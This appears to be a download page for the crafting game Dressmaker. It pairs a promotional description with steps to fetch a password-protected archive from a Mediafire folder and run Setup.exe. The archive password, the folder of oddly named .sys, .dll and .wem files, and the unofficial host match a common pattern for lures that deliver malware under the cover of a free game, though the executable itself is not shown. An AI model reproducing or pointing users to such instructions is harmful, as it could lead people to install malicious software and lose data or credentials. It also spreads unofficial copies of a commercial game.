## 🕹️ About

Dressmaker is a cozy single-player crafting and simulation game developed by Cozy Lives and published by Free Lives. Set in a colorful town, it puts you in charge of a dressmaking shop serving townsfolk with different tastes and special occasions. Choose fabrics, sketch designs, arrange and cut patterns, preview garments on a mannequin, and sew each dress together. Add buttons, bows, appliqué, lace, and other decorations, then deliver commissions to earn reputation and coin or sell finished designs from your shop window. Released on September 21, 2026, the game offers a tactile creative loop inspired by real-world dressmaking without requiring prior sewing knowledge. This package is prepared for straightforward installation of the full game.

Dressmaker is ideal for players who enjoy cozy simulations, creative crafting, fashion design, and relaxed single-player progression.

## ✨ Features

- 🐈 **Cozy Atmosphere** — Enjoy a relaxed, colorful crafting experience with a cat to pet.
- ✂️ **Pattern Crafting** — Arrange patterns carefully, account for fabric grain, and preview your work on a mannequin.
- 🏘️ **Town Commissions** — Create unique dresses for townsfolk based on their tastes and important events.
- 🎨 **Creative Design** — Design and color garments in your sketchbook with fabric samples and appliqué.
- 🧵 **Hands-On Dressmaking** — Control the full process from fabric selection and pattern cutting to sewing.
- ✨ **Custom Decoration** — Personalize dresses with buttons, bows, lace trims, and other accessories.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- settings.bin <- Configuration
|-- assets.wem <- Asset audio
|-- driver.umap <- Driver data
|-- lang.sys <- Language system
|-- global.cfg <- Global settings
|-- Password 2026.txt <- Password reminder (empty)
|-- license.bank <- License data
|-- update_1.res <- Update resources
|-- api.pak <- API modules
|-- physics.sys <- Physics engine
|-- dlc.md5 <- DLC checksums
|-- audio.res <- Audio resources
|-- driver.pak <- Driver archive
|-- animations.dll <- Animation system
|-- installer.dat <- Installer data
|-- license.wem <- Audio assets
|-- patch_1.bnk <- Audio banks
|-- localization.ini <- Language files
|-- scripts.lic <- Game scripts
|-- bootstrap.wem <- Bootstrap audio
|-- launcher.dll <- Launcher library
|-- uninstall.key <- Uninstall key
|-- res.pak <- Resources archive
|-- update_1.ini <- Update config
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
